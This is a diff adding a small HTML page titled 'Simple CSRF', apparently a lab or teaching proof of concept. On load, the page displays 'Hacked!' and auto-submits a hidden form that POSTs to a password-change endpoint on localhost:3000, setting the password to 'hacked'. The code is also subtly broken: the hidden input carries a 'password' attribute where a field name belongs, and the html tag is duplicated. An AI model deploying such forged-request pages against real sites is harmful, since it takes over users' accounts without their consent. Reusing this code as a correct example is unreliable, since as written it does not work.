@@ -1,0 +1,19 @@
+<html>
+<html>
+
+<head>
+	<title>Simple CSRF</title>
+</head>
+
+<body>
+	<!-- sending the request to vulnerable website to change the password -->
+	<h1>Hacked!</h1>
+	<form action="http://localhost:3000/changepass" method="POST">
+		<input type="hidden" password="password" value="hacked" />
+	</form>
+	<script>
+		document.forms[0].submit();
+	</script>
+</body>
+
+</html>
